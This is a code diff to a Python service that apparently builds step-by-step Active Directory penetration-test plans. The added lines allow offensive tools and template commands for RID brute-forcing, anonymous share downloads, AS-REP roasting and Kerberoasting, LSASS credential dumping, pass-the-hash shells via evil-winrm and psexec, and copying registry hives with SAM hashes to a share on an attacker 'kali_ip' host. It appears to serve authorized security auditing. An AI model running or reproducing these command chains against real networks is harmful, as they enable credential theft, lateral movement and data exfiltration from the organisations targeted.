@@ -97,18 +97,40 @@ class AgentService:
         self._processes: dict[str, subprocess.Popen[str]] = {}
         self._lock = threading.Lock()
         self._allowed_tools = {
+            "bloodhound-python",
+            "certipy-ad",
+            "evil-winrm",
+            "impacket-GetNPUsers",
+            "impacket-GetUserSPNs",
+            "impacket-psexec",
+            "impacket-reg",
+            "impacket-smbserver",
             "rustscan",
             "netexec",
             "nxc",
             "nmap",
             "ldapsearch",
+            "kerbrute",
+            "lsassy",
+            "ntpdate",
+            "proxychains",
+            "rpcclient",
             "smbclient",
             "smbmap",
+            "systemctl",
+            "xfreerdp",
         }
 
     def build_plan(self, request: AgentPlanRequest) -> AgentPlan:
         target = request.target_ip if request.target_mode == "ip" and request.target_ip else request.scope_cidr
         domain_arg = f" -d {request.domain}" if request.domain else ""
+        domain = request.domain or "<dominio.local>"
+        username = request.username or "<user>"
+        password = request.password or "<password>"
+        nt_hash = request.nt_hash or "<NT>"
+        share = request.share or "<share>"
+        users_list = request.users_list or "<users_list>"
+        kali_ip = request.kali_ip or "<kali_ip>"
 
         if request.target_mode == "cidr":
             commands = [
@@ -121,29 +143,156 @@ class AgentService:
                 )
             ]
         else:
-            commands = [
-                AgentCommand(
-                    phase="network_discovery",
-                    tool="rustscan",
-                    command=f"rustscan -a {target} --no-banner -- -sCV",
-                    purpose="Enumerar puertos, servicios, versiones y scripts relevantes del target.",
-                    expected_output="Salida RustScan/Nmap sintetizada en la entidad seleccionada.",
-                ),
-                AgentCommand(
-                    phase="ad_host_filter",
-                    tool="nxc",
-                    command=f"nxc smb {target}{domain_arg} --shares",
-                    purpose="Enumerar SMB, hostname, dominio y shares del target seleccionado.",
-                    expected_output="Salida de hosts SMB con hostname, dominio y signing.",
-                ),
-                AgentCommand(
-                    phase="ldap_probe",
-                    tool="nxc",
-                    command=f"nxc ldap {target}{domain_arg}",
-                    purpose="Comprobar LDAP en la IP seleccionada y extraer contexto de dominio si aplica.",
-                    expected_output="Salida LDAP con dominio, hostname y DCs detectados.",
-                ),
-            ]
+            commands_by_phase = {
+                "service_scan": [
+                    AgentCommand(
+                        phase="service_scan",
+                        tool="rustscan",
+                        command=f"rustscan -a {target} --no-banner -- -sCV",
+                        purpose="Enumerar puertos, servicios, versiones y scripts relevantes del target.",
+                        expected_output="Salida RustScan/Nmap sintetizada en la entidad seleccionada.",
+                    ),
+                    AgentCommand(
+                        phase="service_scan",
+                        tool="nmap",
+                        command=f"nmap -sU -p 161 {target}",
+                        purpose="Comprobar SNMP si el host expone UDP/161 o si quieres descartar comunidad publica.",
+                        expected_output="Estado de SNMP y posibles banners o respuestas UDP.",
+                    ),
+                ],
+                "smb_enum": [
+                    AgentCommand(
+                        phase="smb_enum",
+                        tool="nxc",
+                        command=f"nxc smb {target}{domain_arg} --shares",
+                        purpose="Enumerar SMB, hostname, dominio, signing y shares del target seleccionado.",
+                        expected_output="Shares, permisos y contexto SMB del host.",
+                    ),
+                    AgentCommand(
+                        phase="smb_enum",
+                        tool="nxc",
+                        command=f"nxc smb {target} -u '' -p '' --rid-brute",
+                        purpose="Probar RID brute sin credenciales cuando el entorno lo permite.",
+                        expected_output="Usuarios/grupos descubiertos por RID brute.",
+                    ),
+                    AgentCommand(
+                        phase="smb_enum",
+                        tool="smbclient",
+                        command=f"smbclient -N //{target}/{share}/ -c \"recurse; prompt; mget *;\"",
+                        purpose="Descargar un share anonimo seleccionado para revisar evidencias rapido.",
+                        expected_output="Ficheros descargados del share indicado.",
+                    ),
+                ],
+                "ldap_enum": [
+                    AgentCommand(
+                        phase="ldap_enum",
+                        tool="nxc",
+                        command=f"nxc ldap {target}{domain_arg}",
+                        purpose="Comprobar LDAP y extraer contexto de dominio si aplica.",
+                        expected_output="Dominio, hostname y respuesta LDAP del target.",
+                    ),
+                    AgentCommand(
+                        phase="ldap_enum",
+                        tool="ldapsearch",
+                        command=f"ldapsearch -x -H ldap://{target} -D '{username}@{domain}' -w '{password}' -b 'DC=<domain_part>,DC=<domain_part>'",
+                        purpose="Enumerar LDAP autenticado con el usuario indicado.",
+                        expected_output="Objetos LDAP relevantes para usuarios, equipos, grupos y descripciones.",
+                    ),
+                    AgentCommand(
+                        phase="ldap_enum",
+                        tool="bloodhound-python",
+                        command=f"bloodhound-python -u {username} -p {password} -ns {target} -d {domain} -c all",
+                        purpose="Recolectar relaciones AD para BloodHound.",
+                        expected_output="JSON de BloodHound para importar en Neo4j/BloodHound.",
+                    ),
+                ],
+                "kerberos_enum": [
+                    AgentCommand(
+                        phase="kerberos_enum",
+                        tool="ntpdate",
+                        command=f"ntpdate {target}",
+                        purpose="Sincronizar hora contra el DC antes de pruebas Kerberos.",
+                        expected_output="Hora local alineada con el controlador de dominio.",
+                    ),
+                    AgentCommand(
+                        phase="kerberos_enum",
+                        tool="kerbrute",
+                        command=f"kerbrute userenum --dc {target} -d {domain} {users_list}",
+                        purpose="Validar usuarios por Kerberos usando la lista indicada.",
+                        expected_output="Usuarios validos detectados.",
+                    ),
+                    AgentCommand(
+                        phase="kerberos_enum",
+                        tool="impacket-GetNPUsers",
+                        command=f"impacket-GetNPUsers -no-pass -usersfile {users_list} -dc-ip {target} {domain}/",
+                        purpose="Buscar cuentas AS-REP roastables sin password.",
+                        expected_output="Hashes AS-REP si existen cuentas vulnerables.",
+                    ),
+                ],
+                "credential_checks": [
+                    AgentCommand(
+                        phase="credential_checks",
+                        tool="impacket-GetUserSPNs",
+                        command=f"impacket-GetUserSPNs {domain}/{username}:{password} -dc-ip {target} -request -outputfile hashes",
+                        purpose="Kerberoasting con las credenciales seleccionadas.",
+                        expected_output="Hashes TGS para crackeo offline si hay SPNs.",
+                    ),
+                    AgentCommand(
+                        phase="credential_checks",
+                        tool="certipy-ad",
+                        command=f"certipy-ad find -u {username} -p {password} -dc-ip {target} -vulnerable",
+                        purpose="Buscar plantillas ADCS vulnerables.",
+                        expected_output="Hallazgos ADCS y paths de explotacion si aplican.",
+                    ),
+                    AgentCommand(
+                        phase="credential_checks",
+                        tool="lsassy",
+                        command=f"lsassy -d {domain} -u {username} -H ':{nt_hash}' {target}",
+                        purpose="Intentar extracción LSASS con hash NT cuando el usuario sea admin local.",
+                        expected_output="Credenciales o hashes recuperados si hay privilegios.",
+                    ),
+                ],
+                "exploitation": [
+                    AgentCommand(
+                        phase="exploitation",
+                        tool="evil-winrm",
+                        command=f"evil-winrm -i {target} -u {username} -p {password}",
+                        purpose="Abrir sesión WinRM con usuario y password.",
+                        expected_output="Shell interactiva WinRM si las credenciales son validas.",
+                    ),
+                    AgentCommand(
+                        phase="exploitation",
+                        tool="evil-winrm",
+                        command=f"evil-winrm -i {target} -u {username} -H {nt_hash}",
+                        purpose="Abrir sesión WinRM con hash NT.",
+                        expected_output="Shell interactiva WinRM si el hash es valido.",
+                    ),
+                    AgentCommand(
+                        phase="exploitation",
+                        tool="impacket-psexec",
+                        command=f"impacket-psexec {username}@{target} -hashes <LM>:{nt_hash}",
+                        purpose="Ejecutar psexec con hash cuando haya privilegios administrativos.",
+                        expected_output="Shell remota o error de permisos/autenticacion.",
+                    ),
+                ],
+                "extraction": [
+                    AgentCommand(
+                        phase="extraction",
+                        tool="impacket-reg",
+                        command=f"impacket-reg '{domain}/{username}:{password}@{target}' backup -o '\\\\{kali_ip}\\recurso'",
+                        purpose="Extraer hives de registro hacia el share de Kali.",
+                        expected_output="SAM, SYSTEM y SECURITY copiados si hay permisos.",
+                    ),
+                    AgentCommand(
+                        phase="extraction",
+                        tool="nxc",
+                        command=f"nxc smb {target} -u {username} -p {password} --sam",
+                        purpose="Extraer SAM usando NetExec si las credenciales lo permiten.",
+                        expected_output="Hashes locales o error de privilegios.",
+                    ),
+                ],
+            }
+            commands = commands_by_phase[request.audit_phase]
 
         return AgentPlan(
             scope_cidr=request.scope_cidr,
